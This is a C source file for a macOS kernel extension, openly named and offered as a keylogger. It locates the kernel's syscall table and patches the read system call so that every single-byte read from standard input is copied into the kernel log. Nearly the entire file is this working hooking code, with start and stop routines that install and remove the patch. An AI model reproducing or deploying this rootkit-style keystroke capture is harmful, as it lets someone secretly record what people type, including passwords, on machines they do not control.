/*
 * keyLogger.c
 *
 * Author: Jesse 'x30n' D'Aguanno <x30n@digrev.org>
 * This software is placed in the public domain
 * 
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR AND CONTRIBUTORS "AS IS"
 * AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED. IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS BE
 * LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
 * CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
 * INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
 * CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
 * ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
 * POSSIBILITY OF SUCH DAMAGE.
 */

#include <mach/mach_types.h>
#include <sys/systm.h>
#include <sys/kernel.h>
#include <stdint.h>
#include "structures.h"

static struct sysent *_sysent;
extern int nsysent;

typedef int	sysc_func_t (struct proc *, void *, int *);
static sysc_func_t *real_read;


static int my_read(struct proc *p, void *syscall_args, int *retval) {
	struct read_args {
        char fd_l_[PADL_(int)]; int fd; char fd_r_[PADR_(int)];
        char cbuf_l_[PADL_(user_addr_t)]; user_addr_t cbuf; char cbuf_r_[PADR_(user_addr_t)];
        char nbyte_l_[PADL_(user_size_t)]; user_size_t nbyte; char nbyte_r_[PADR_(user_size_t)];
	} *uap;
	
	uap = (struct read_args *)syscall_args;
	
	int error;
	char buf[1];
	int done;
	
	error = real_read(p, uap, retval);
	if(error || (!uap->nbyte) || (uap->nbyte > 1) || (uap->fd != 0)) {
		return(error);
	}
	
	copyinstr(uap->cbuf, buf, 1, &done);
	printf("%c\n", buf[0]);
	
	return(error);
}

/*
	char path[255];
	size_t done;
	int error;
	error = copyinstr(uap->path, path, 255, &done);
	if(error != 0) {
		return(error);
	}
	
	printf("The directory \"%s\" will be created with the following Permissions: %o\n", path, uap->mode);
	
	return(real_mkdir(p, uap, retval));
}
*/

static struct sysent *find_sysent () {
	unsigned int table_size;
	struct sysent *table;

	table_size = sizeof(struct sysent) * nsysent;
	table = (struct sysent *) ( ((char *) &nsysent) + sizeof(nsysent) );

#if __i386__
	/* For reasons unknown, the table is offset by an additional 28 bytes on my i386 system */
	table = (struct sysent *) ( ((uint8_t *) table) + 28);
#endif

	printf("[Arf] Found nsysent at %p (count %d), calculated sysent location %p.\n", &nsysent, nsysent, table);

	/* Sanity check */
	printf("[Arf] Sanity check %d %d %d %d %d %d: ",
		table[SYS_syscall].sy_narg,
		table[SYS_exit].sy_narg,
		table[SYS_fork].sy_narg,
		table[SYS_read].sy_narg,
		table[SYS_wait4].sy_narg,
		table[SYS_ptrace].sy_narg);

	if (table[SYS_syscall].sy_narg == 0 &&
		table[SYS_exit].sy_narg == 1  &&
		table[SYS_fork].sy_narg == 0 &&
		table[SYS_read].sy_narg == 3 &&
		table[SYS_wait4].sy_narg == 4 &&
		table[SYS_ptrace].sy_narg == 4)
	{
		printf("sysent sanity check succeeded.\n");
		return table;
	} else {
		printf("sanity check failed, could not find sysent table.\n");
		return NULL;
	}
}


kern_return_t keyLogger_start (kmod_info_t * ki, void * d) {
	_sysent = find_sysent();
	if (_sysent == NULL) {
		return KERN_FAILURE;
	}

	real_read = (sysc_func_t *) _sysent[SYS_read].sy_call;
	_sysent[SYS_read].sy_call = (sy_call_t *) my_read;
	printf("[Arf] Patching read syscall.\n");
    return KERN_SUCCESS;
}


kern_return_t keyLogger_stop (kmod_info_t * ki, void * d) {
	_sysent[SYS_read].sy_call = (sy_call_t *) real_read;
	printf("[Arf] Unpatching read syscall\n");
    return KERN_SUCCESS;
}
